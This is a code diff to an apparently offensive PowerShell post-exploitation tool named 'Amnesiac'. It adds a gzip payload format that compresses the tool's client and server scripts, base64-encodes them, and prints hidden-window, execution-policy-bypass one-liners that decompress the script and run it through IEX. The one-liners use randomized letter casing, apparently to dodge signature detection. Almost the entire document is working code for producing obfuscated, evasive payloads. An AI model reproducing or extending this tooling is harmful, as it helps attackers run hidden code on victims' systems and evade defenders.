@@ -166,6 +166,10 @@ function Amnesiac {
 				$global:Message = " [+] Payload format: cmd(raw)"
 			}
 			elseif($global:payloadformat -eq 'raw'){
+				$global:payloadformat = 'gzip'
+				$global:Message = " [+] Payload format: gzip"
+			}
+   			elseif($global:payloadformat -eq 'gzip'){
 				$global:payloadformat = 'b64'
 				$global:Message = " [+] Payload format: cmd(b64)"
 			}
@@ -1163,6 +1167,19 @@ while (`$true) {
 			Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 			Write-Output ""
 		}
+  		elseif($global:payloadformat -eq 'gzip'){
+			$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawClientScript)
+			$memoryStream = [System.IO.MemoryStream]::new()
+			$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
+			$gzipCompressor.Write($bytesToCompress, 0, $bytesToCompress.Length)
+			$gzipCompressor.Close()
+			$gzipcompressedBytes = $memoryStream.ToArray()
+			$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
+			Write-Output " `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
+			Write-Output ""
+			Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
+			Write-Output ""
+		}
 	}
 
 	# Create security descriptor to allow everyone full control over the pipe
@@ -1311,6 +1328,19 @@ while (`$true) {
 		$ServerScriptEdit = $ServerScript += ";exit"
 		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
 		Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+		Write-Output ""
+	}
+ 	elseif($global:payloadformat -eq 'gzip'){
+		$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawServerScript)
+		$memoryStream = [System.IO.MemoryStream]::new()
+		$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
+		$gzipCompressor.Write($bytesToCompress, 0, $bytesToCompress.Length)
+		$gzipCompressor.Close()
+		$gzipcompressedBytes = $memoryStream.ToArray()
+		$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
+		Write-Output " `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
+		Write-Output ""
+		Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
 		Write-Output ""
 	}
 	
@@ -1871,10 +1901,14 @@ function InteractWithPipeSession{
 				Write-Host ""
 			}
 			elseif($global:payloadformat -eq 'raw'){
+				$global:payloadformat = 'gzip'
+				Write-Host ""
+				Write-Host "[+] Payload format: gzip" -Foreground yellow
+				Write-Host ""
+			}
+   			elseif($global:payloadformat -eq 'gzip'){
 				$global:payloadformat = 'b64'
-				Write-Host ""
-				Write-Host "[+] Payload format: cmd(b64)" -Foreground yellow
-				Write-Host ""
+				$global:Message = " [+] Payload format: cmd(b64)"
 			}
 			continue
 		}
